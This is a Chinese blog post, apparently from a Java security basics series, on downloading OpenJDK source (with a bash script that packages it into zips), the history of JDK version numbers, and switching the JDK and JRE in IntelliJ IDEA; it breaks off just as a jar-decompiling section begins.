<p>我们下载的 Oracle JDK 只提供了 <code>java</code> 和 <code>javax</code> 包下的源码，没有 <code>sun</code> 包源码，这时候就需要去 OpenJDK 官网下载 JDK 源码：</p>
<ul>
<li><a class="link"   target="_blank" rel="noopener" href="https://hg.openjdk.org/jdk8u/jdk8u/tags" >https://hg.openjdk.org/jdk8u/jdk8u/tags<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
<li><a class="link"   target="_blank" rel="noopener" href="https://hg.openjdk.org/jdk/jdk/tags" >https://hg.openjdk.org/jdk/jdk/tags<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
</ul>
<p>如果官网访问不了还何以去 github 下载：</p>
<ul>
<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/openjdk" >https://github.com/openjdk<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
</ul>
<p>例如我们运行 <code>java -version</code> 后的输出内容如下：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java version &quot;1.8.0_112&quot;</span><br><span class="line">Java(TM) SE Runtime Environment (build 1.8.0_112-b15)</span><br><span class="line">Java HotSpot(TM) 64-Bit Server VM (build 25.112-b15, mixed mode)</span><br></pre></td></tr></table></figure></div>

<p>那么当前的 JAVA 版本是 8u112-b15，因此我们需要选择对应的 <a class="link"   target="_blank" rel="noopener" href="https://hg.openjdk.org/jdk8u/jdk8u/rev/bfb88850a367" >jdk8u112-b15<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 版本的源码下载。</p>
<blockquote>
<p>Oracle 对 8u112 还做过 <strong>BPR（Bundled Patch Release）</strong>，这类补丁版不是公开 GA，而是订阅&#x2F;支持渠道提供；Oracle 的 8u112 BPR 发布说明里就有“<strong>Changes in Java SE 8u112 b32</strong>”。这解释了你看到的更高 <code>-bXX</code> 号。</p>
<p>OpenJDK 历史上也对 8u112 分支继续打了多个 tag，例如 <code>.hgtags</code> 中可见 **<code>jdk8u112-b31</code>、<code>-b32</code>、<code>-b33</code>**；GitHub 的 <code>openjdk/jdk8u</code> 也保留了 <strong><code>jdk8u112-b33</code></strong> 的标签。它们代表在 8u112 线上继续集成的一批修复&#x2F;合并。</p>
<p>直观理解：</p>
<ul>
<li><strong><code>jdk8u112-b15</code> &#x3D; 8u112 的 GA</strong>（和 Oracle 公版对应）。</li>
<li><strong><code>jdk8u112-b31/32/33</code> &#x3D; 8u112 分支的后续构建</strong>（相当于 BPR&#x2F;持续 backport），并非“下一个大版本”（那是 8u121）。</li>
</ul>
</blockquote>
<p>点击 <code>zip</code> 下载源码压缩包后，将 <code>sun</code> 目录复制到JDK的安装目录下的 <code>src</code>，IDEA 中 <code>Project Structure-&gt;SDKs-&gt;SourcePath</code>，添加 <code>src</code> 目录。</p>
<p>高版本 JDK 的目录变了，并且下压缩包不利于离线，一种方法是直接把 <code>jdk8u-dev</code> 和 <code>jdk8u</code> 仓库下载到本地，然后导出指定版本的 Java 源码压缩包。</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 克隆并取全量标签</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/openjdk/jdk8u-dev.git &amp;&amp; <span class="built_in">cd</span> jdk8u-dev</span><br><span class="line">git fetch --tags --force</span><br><span class="line"><span class="comment"># 2) 看看都有哪些 8u 标签（可选）</span></span><br><span class="line">git tag -l <span class="string">&#x27;jdk8u*-b*&#x27;</span> | <span class="built_in">sort</span> -V | <span class="built_in">tail</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> .. &amp;&amp; git <span class="built_in">clone</span> https://github.com/openjdk/jdk8u.git &amp;&amp; <span class="built_in">cd</span> jdk8u</span><br><span class="line">git fetch --tags --force</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><p><strong><code>jdk8u-dev</code><strong>：</strong>开发&#x2F;集成库</strong>（development）。新 backport、修复先并到这里，做集成测试、预发。</p>
</li>
<li><p><strong><code>jdk8u</code><strong>：</strong>稳定&#x2F;发布库</strong>（release）。当某个 update 版本稳定后，从 <code>-dev</code> 迁到这里，作为正式发布基线。</p>
</li>
</ul>
<p>很多 <strong>release 标签</strong>（比如 <code>jdk8u191-b12</code>）在两个库里都能找到；极少数老&#x2F;特殊标签可能只在其中一个。</p>
</blockquote>
<p>然后根据需求导出指定版本的 JDK 源码目录为 ZIP 压缩包：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env bash</span></span><br><span class="line"><span class="built_in">set</span> -Eeuo pipefail</span><br><span class="line"></span><br><span class="line"><span class="comment"># --- 参数与默认值（先解析 TAG，再派生 OUT/OUT_TOOLS） ---</span></span><br><span class="line">TAG_DEFAULT=<span class="string">&quot;jdk8u192-b12&quot;</span></span><br><span class="line">TAG=<span class="string">&quot;<span class="variable">$&#123;1:-<span class="variable">$&#123;TAG:-<span class="variable">$TAG_DEFAULT</span>&#125;</span>&#125;</span>&quot;</span></span><br><span class="line">OUT=<span class="string">&quot;<span class="variable">$&#123;2:-src-$TAG.zip&#125;</span>&quot;</span></span><br><span class="line">OUT_TOOLS=<span class="string">&quot;<span class="variable">$&#123;3:-tools-$TAG.zip&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># --- 临时目录与工作子目录（确保已赋值） ---</span></span><br><span class="line"><span class="comment"># 兼容 macOS: 如果 mktemp -d 不可用，则退回 -t 模式</span></span><br><span class="line">STAGE=<span class="string">&quot;<span class="subst">$(mktemp -d 2&gt;/dev/null || mktemp -d -t srczip)</span>&quot;</span></span><br><span class="line">ROOT=<span class="string">&quot;<span class="variable">$STAGE</span>/srczip&quot;</span></span><br><span class="line">TOOLS=<span class="string">&quot;<span class="variable">$STAGE</span>/toolssrc&quot;</span></span><br><span class="line"><span class="built_in">mkdir</span> -p <span class="string">&quot;<span class="variable">$ROOT</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">cleanup</span></span>() &#123; <span class="built_in">rm</span> -rf <span class="string">&quot;<span class="variable">$STAGE</span>&quot;</span>; &#125;</span><br><span class="line"><span class="built_in">trap</span> cleanup EXIT INT TERM</span><br><span class="line"></span><br><span class="line"><span class="comment"># --- 1) JDK 类库源码（放到根） ---</span></span><br><span class="line">rsync -a jdk/src/share/classes/ <span class="string">&quot;<span class="variable">$ROOT</span>/&quot;</span></span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> solaris windows macosx bsd linux; <span class="keyword">do</span></span><br><span class="line">  [ -d <span class="string">&quot;jdk/src/<span class="variable">$d</span>/classes&quot;</span> ] &amp;&amp; rsync -a <span class="string">&quot;jdk/src/<span class="variable">$d</span>/classes/&quot;</span> <span class="string">&quot;<span class="variable">$ROOT</span>/&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># --- 2) Nashorn 源码（放到根，会得到根下的 jdk/nashorn/**） ---</span></span><br><span class="line">[ -d <span class="string">&quot;nashorn/src&quot;</span> ] &amp;&amp; rsync -a nashorn/src/ <span class="string">&quot;<span class="variable">$ROOT</span>/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># --- 3) （可选）编译器/工具源码，单独一个包 ---</span></span><br><span class="line">copy_tools=0</span><br><span class="line"><span class="keyword">if</span> [ -d <span class="string">&quot;langtools/src/share/classes&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">  copy_tools=1</span><br><span class="line">  <span class="built_in">mkdir</span> -p <span class="string">&quot;<span class="variable">$TOOLS</span>&quot;</span></span><br><span class="line">  rsync -a langtools/src/share/classes/ <span class="string">&quot;<span class="variable">$TOOLS</span>/&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># --- 4) 打包到“当前工作目录” ---</span></span><br><span class="line"><span class="function"><span class="title">is_abs</span></span>() &#123; <span class="keyword">case</span> <span class="string">&quot;<span class="variable">$1</span>&quot;</span> <span class="keyword">in</span> /*) <span class="built_in">return</span> 0 ;; *) <span class="built_in">return</span> 1 ;; <span class="keyword">esac</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 主包</span></span><br><span class="line"><span class="keyword">if</span> is_abs <span class="string">&quot;<span class="variable">$OUT</span>&quot;</span>; <span class="keyword">then</span></span><br><span class="line">  OUT_ABS=<span class="string">&quot;<span class="variable">$OUT</span>&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  OUT_ABS=<span class="string">&quot;<span class="variable">$PWD</span>/<span class="variable">$OUT</span>&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">mkdir</span> -p <span class="string">&quot;<span class="subst">$(dirname <span class="string">&quot;<span class="variable">$OUT_ABS</span>&quot;</span>)</span>&quot;</span></span><br><span class="line">( <span class="built_in">cd</span> <span class="string">&quot;<span class="variable">$ROOT</span>&quot;</span> &amp;&amp; zip -qr <span class="string">&quot;<span class="variable">$OUT_ABS</span>&quot;</span> . )</span><br><span class="line"></span><br><span class="line"><span class="comment"># 工具包（如果有）</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$copy_tools</span> -eq 1 ]; <span class="keyword">then</span></span><br><span class="line">  <span class="keyword">if</span> is_abs <span class="string">&quot;<span class="variable">$OUT_TOOLS</span>&quot;</span>; <span class="keyword">then</span></span><br><span class="line">    OUT_TOOLS_ABS=<span class="string">&quot;<span class="variable">$OUT_TOOLS</span>&quot;</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    OUT_TOOLS_ABS=<span class="string">&quot;<span class="variable">$PWD</span>/<span class="variable">$OUT_TOOLS</span>&quot;</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line">  <span class="built_in">mkdir</span> -p <span class="string">&quot;<span class="subst">$(dirname <span class="string">&quot;<span class="variable">$OUT_TOOLS_ABS</span>&quot;</span>)</span>&quot;</span></span><br><span class="line">  ( <span class="built_in">cd</span> <span class="string">&quot;<span class="variable">$TOOLS</span>&quot;</span> &amp;&amp; zip -qr <span class="string">&quot;<span class="variable">$OUT_TOOLS_ABS</span>&quot;</span> . )</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;生成：<span class="variable">$OUT</span>   ← 挂在 IDEA 的 JDK Sources&quot;</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$copy_tools</span> -eq 1 ]; <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;生成（可选）：<span class="variable">$OUT_TOOLS</span> ← 挂在 SDK 的 Additional Sources 或单独库&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure></div>

<h3 id="JDK-的版本号演变"><a href="#JDK-的版本号演变" class="headerlink" title="JDK 的版本号演变"></a>JDK 的版本号演变</h3><h4 id="JDK-1-x-阶段（Java-的早期版本）"><a href="#JDK-1-x-阶段（Java-的早期版本）" class="headerlink" title="JDK 1.x 阶段（Java 的早期版本）"></a>JDK 1.x 阶段（Java 的早期版本）</h4><p>在这一阶段，Java 的版本号采用的是 <code>1.x</code> 的命名方式。从 <strong>JDK 1.0</strong> 到 <strong>JDK 1.4</strong>，每次更新都依赖于 <strong>1.x</strong> 的版本号来标识，包含了 Java 语言的最初发展和许多核心特性。</p>
<ul>
<li><strong>JDK 1.0 (1996)</strong> ：Java 的第一个版本，提供了最基本的类库和工具，标志着 Java 语言的正式发布。</li>
<li><strong>JDK 1.1 (1997)</strong> ：增强了 Java 的图形用户界面（GUI）能力，增加了 Java Beans、反射 API、JDBC 等重要功能。</li>
<li><strong>JDK 1.2 (1998)</strong> ：引入了 <strong>Java 2</strong> 的概念，增强了企业级开发（J2EE）和桌面应用开发（J2SE）支持，支持了集合框架、Swing 等技术。J2EE、J2SE 和 J2ME 架构首次提出。</li>
<li><strong>JDK 1.3 (2000)</strong> ：增加了更多的性能优化，改进了 RMI（远程方法调用）和 CORBA 支持。</li>
<li><strong>JDK 1.4 (2002)</strong> ：引入了正则表达式（regex）、日志 API、NIO（New I&#x2F;O）等新特性，进一步增强了 Java 在企业级应用中的功能。</li>
</ul>
<h4 id="Java-x-阶段（Java-语言的重大变革）"><a href="#Java-x-阶段（Java-语言的重大变革）" class="headerlink" title="Java x 阶段（Java 语言的重大变革）"></a>Java x 阶段（Java 语言的重大变革）</h4><p>此阶段的标志是 Java 从 <code>1.x</code> 版本号跳跃至 <strong>Java 5</strong>（JDK 1.5），进入了语言层面的重大更新。在 <strong>Java 5（JDK 1.5）</strong> 之后，Java 版本号逐步向更简洁的 <strong>Java x</strong> 命名方式发展，这也标志着 Java 语言和平台开始与更现代的开发理念接轨。</p>
<ul>
<li><strong>Java 5（JDK 1.5, 2004）</strong> ：这是 Java 语言的重大更新，引入了泛型、枚举类型、注解、增强的 <code>for</code> 循环等特性。为了突出其重要性，版本号直接跳跃至 <strong>Java 5</strong>，不再沿用 <code>1.x</code> 的版本号。这一版本的发布使得 Java 在语言层面发生了革命性的变化，正式支持了泛型和注解。</li>
<li><strong>Java 6（JDK 1.6, 2006）</strong> ：改进了性能和 JDK 本身的功能，增强了对编译器和脚本语言的支持，引入了 <strong>Java Compiler API</strong> 和 <strong>Java Shell</strong>。</li>
<li><strong>Java 7（JDK 1.7, 2011）</strong> ：引入了 <code>try-with-resources</code> 语法、改进的 I&#x2F;O（NIO 2）、Switch 支持字符串等新特性，增强了语言和库功能。</li>
<li><strong>Java 8（JDK 1.8, 2014）</strong> ：这一版本非常重要，该版本带来了 <strong>Lambda 表达式</strong>、<strong>Stream API</strong>、<strong>java.time 日期时间 API</strong> 等新特性，开始支持 <strong>函数式编程</strong>，极大地提高了开发效率。</li>
</ul>
<h4 id="JDK-x-阶段（现代的-JDK-版本）"><a href="#JDK-x-阶段（现代的-JDK-版本）" class="headerlink" title="JDK x 阶段（现代的 JDK 版本）"></a>JDK x 阶段（现代的 JDK 版本）</h4><p>从 <strong>JDK 9</strong> 开始，Java 进入了一个新的发展阶段，采用了更加简洁的版本号，并且开始实行 <strong>每六个月发布一个新版本</strong> 的计划。JDK 9 引入了 <strong>模块化系统（Project Jigsaw）</strong>，并且进一步加强了语言功能、JVM 性能和标准库。</p>
<ul>
<li><strong>JDK 9（2017）</strong> ：引入了 <strong>模块化系统（Project Jigsaw）</strong>，允许开发者将应用程序划分为模块，提高了 Java 的灵活性和可维护性。此版本是第一个采用新版本号格式的版本，标志着从 <strong>1.x</strong> 系列向简化版本号过渡。</li>
<li><strong>JDK 10（2018）</strong> ：引入了 <strong>局部变量类型推断（var）</strong>，增强了 Java 的开发效率，并开始了更频繁的版本发布周期。</li>
<li><strong>JDK 11（2018）</strong> ：这是一个 <strong>长期支持（LTS）版本</strong>，作为 <strong>LTS</strong> 版本，JDK 11 被广泛应用于生产环境，并且继续加强了模块化功能。</li>
<li><strong>JDK 12、13、14 等（2019-2020）</strong> ：这些版本主要聚焦于性能改进、垃圾收集器的增强、语言的进一步优化等，继续沿用 <strong>JDK x</strong> 版本号。</li>
<li><strong>JDK 17（2021）</strong> ：另一个 <strong>LTS 版本</strong>，在许多企业环境中被广泛使用。该版本提供了更多的语言特性改进、JVM 性能优化和稳定性增强。</li>
</ul>
<h3 id="在-IDEA-中切换-JDK"><a href="#在-IDEA-中切换-JDK" class="headerlink" title="在 IDEA 中切换 JDK"></a>在 IDEA 中切换 JDK</h3><h4 id="切换-Java-开发工具"><a href="#切换-Java-开发工具" class="headerlink" title="切换 Java 开发工具"></a>切换 Java 开发工具</h4><p>这里切换的主要是编译 java 文件所依赖的 Java 开发工具。Java 开发工具编译生成的 class 文件在通过 JRE 加载运行时会检查版本，如果版本不匹配通常会有如下报错：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">java.lang.UnsupportedClassVersionError: com/example/Main has been compiled by a more recent version of the Java Runtime (class file version 65.0), this version of the Java Runtime only recognizes class file versions up to 52.0</span><br><span class="line">    at java.lang.ClassLoader.defineClass1(Native Method)</span><br><span class="line">    at java.lang.ClassLoader.defineClass(ClassLoader.java:760)</span><br><span class="line">    at java.security.SecureClassLoader.defineClass(SecureClassLoader.java:142)</span><br><span class="line">    at java.net.URLClassLoader.defineClass(URLClassLoader.java:455)</span><br><span class="line">    at java.net.URLClassLoader.access$100(URLClassLoader.java:73)</span><br><span class="line">    at java.net.URLClassLoader$1.run(URLClassLoader.java:367)</span><br><span class="line">    at java.net.URLClassLoader$1.run(URLClassLoader.java:361)</span><br><span class="line">    at java.security.AccessController.doPrivileged(Native Method)</span><br><span class="line">    at java.net.URLClassLoader.findClass(URLClassLoader.java:360)</span><br><span class="line">    at java.lang.ClassLoader.loadClass(ClassLoader.java:424)</span><br><span class="line">    at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:308)</span><br><span class="line">    at java.lang.ClassLoader.loadClass(ClassLoader.java:357)</span><br><span class="line">    at sun.launcher.LauncherHelper.checkAndLoadMain(LauncherHelper.java:495)</span><br><span class="line">Exception in thread &quot;main&quot; </span><br></pre></td></tr></table></figure></div>


  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content markdown-body">
      <p>JRE 对 Java 开发工具向下兼容，也就是说如果我们用新版的 JRE 加载运行旧版本的 Java 开发工具编译的 class 文件通常不会报错，但反之会出现上述报错。</p>

    </div>
  </div>

<p>在 IDEA 中我们通常需要打开 <code>文件 → 项目结构</code> 然后选择所需 Java 开发工具对应的 JDK。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/11/Java%20%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/images/image-20250214011127711.png"
                      alt="image-20250214011127711"
                ></p>
<h4 id="切换-JRE"><a href="#切换-JRE" class="headerlink" title="切换 JRE"></a>切换 JRE</h4><p>在 IDEA 中我们通常需要点击 <code>编辑配置...</code>：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/11/Java%20%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/images/image-20250214011429725.png"
                      alt="image-20250214011429725"
                ></p>
<p>在 <code>构建并运行</code> 处选择运行所需的 JRE 对应的 JDK 版本。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/11/Java%20%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/images/image-20250214011347300.png"
                      alt="image-20250214011347300"
                ></p>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content markdown-body">
      <p>通常我们测试 Java 的特性的时候看的就是这里的 Java 版本。</p>

    </div>
  </div>

<h1 id="Java-项目分析"><a href="#Java-项目分析" class="headerlink" title="Java 项目分析"></a>Java 项目分析</h1><h2 id="Jar-包还原-Java-项目"><a href="#Jar-包还原-Java-项目" class="headerlink" title="Jar 包还原 Java 项目"></a>Jar 包还原 Java 项目</h2><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span 